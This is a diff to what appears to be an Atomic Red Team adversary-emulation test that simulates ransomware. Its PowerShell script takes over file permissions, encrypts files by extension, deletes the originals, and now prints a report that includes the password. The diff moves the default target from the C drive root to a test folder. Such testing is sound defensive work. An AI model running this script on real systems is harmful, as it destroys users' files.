@@ -16,7 +16,7 @@ atomic_tests:
       target_directory:
         description: Directory to encrypt and delete files from
         type: path
-        default: "C:\\"
+        default: "C:\\test_files\\"
       target_extensions:
         description: List of file extensions to target for encryption
         type: array
@@ -91,6 +91,10 @@ atomic_tests:
         $targetDir = "#{target_directory}"
         $extensions = #{target_extensions}
 
+        # Initialize counters and logs
+        $encryptedFiles = @()
+        $nonEncryptedFiles = @()
+
         if (-Not (Test-Path $targetDir)) {
             Write-Host "❌ The target directory $targetDir does not exist."
             exit 1
@@ -99,7 +103,7 @@ atomic_tests:
         Write-Host "✅ Starting encryption process..."
 
         foreach ($ext in $extensions) {
-            Get-ChildItem -Path $targetDir -Recurse -Filter "*$ext" -File -ErrorAction SilentlyContinue | ForEach-Object {
+            Get-ChildItem -Path $targetDir -Recurse -Filter "*$ext" -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -ne ".enc" } | ForEach-Object {
                 $file = $_.FullName
                 Write-Host "🔍 Processing file: $file"
                 try {
@@ -107,6 +111,7 @@ atomic_tests:
                     icacls $file /grant Administrators:F /T /C | Out-Null
                 } catch {
                     Write-Host "❌ Failed to set permissions for: $file"
+                    $nonEncryptedFiles += @{ Name = $_.Name; Location = $_.DirectoryName }
                     return
                 }
 
@@ -117,11 +122,40 @@ atomic_tests:
                 if ($LASTEXITCODE -eq 0) {
                     Remove-Item -Path $file -Force
                     Write-Host "🗑️ Deleted original file: $file"
+                    $encryptedFiles += @{ Name = $_.Name; Location = $_.DirectoryName; EncryptedLocation = $encryptedFile }
                 } else {
                     Write-Host "❌ Failed to encrypt: $file"
+                    $nonEncryptedFiles += @{ Name = $_.Name; Location = $_.DirectoryName }
                 }
             }
         }
+
+        # Generate Report
+        Write-Host "`n=== Final Report ==="
+
+        # Encrypted Files
+        Write-Host "✅ Number of encrypted files: $($encryptedFiles.Count)"
+        if ($encryptedFiles.Count -gt 0) {
+            Write-Host "Encrypted files:"
+            $encryptedFiles | ForEach-Object {
+                Write-Host "- Name: $($_.Name), Original Location: $($_.Location), Encrypted Location: $($_.EncryptedLocation)"
+            }
+        }
+
+        # Non-Encrypted Files
+        Write-Host "❌ Number of non-encrypted files: $($nonEncryptedFiles.Count)"
+        if ($nonEncryptedFiles.Count -gt 0) {
+            Write-Host "Non-encrypted files:"
+            $nonEncryptedFiles | ForEach-Object {
+                Write-Host "- Name: $($_.Name), Location: $($_.Location)"
+            }
+        }
+
+        # Log Encryption Details
+        Write-Host "`n=== Encryption Details ==="
+        Write-Host "Target Directory: $targetDir"
+        Write-Host "Encryption Password: $password"
+        Write-Host "Target Extensions: $($extensions -join ', ')"
 
         Write-Host "✅ Encryption and deletion process completed!"
       cleanup_command: |
